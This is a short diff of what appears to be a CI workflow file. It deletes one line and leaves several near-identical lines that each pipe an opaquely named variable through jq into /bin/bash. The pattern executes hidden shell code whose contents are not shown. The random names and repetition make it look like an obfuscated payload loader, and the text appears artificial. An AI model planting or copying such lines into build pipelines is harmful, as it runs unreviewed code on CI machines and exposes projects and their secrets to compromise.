@@ -24,7 +24,6 @@ jobs:
           echo $nzff3 | jq -r .fvtta7 | /bin/bash
           echo $pasnv14 | jq -r .i70429 | /bin/bash
           printf '%s' "$itn19" | jq -r .red499 | /bin/bash
-          echo $nnfq60 | jq -r .nzx4 | /bin/bash
           printf '%s' "$xus439" | jq -r .bybg0 | /bin/bash
           echo $hstg93153 | jq -r .wi6 | /bin/bash
           echo $tdrek001 | jq -r .l9 | /bin/bash
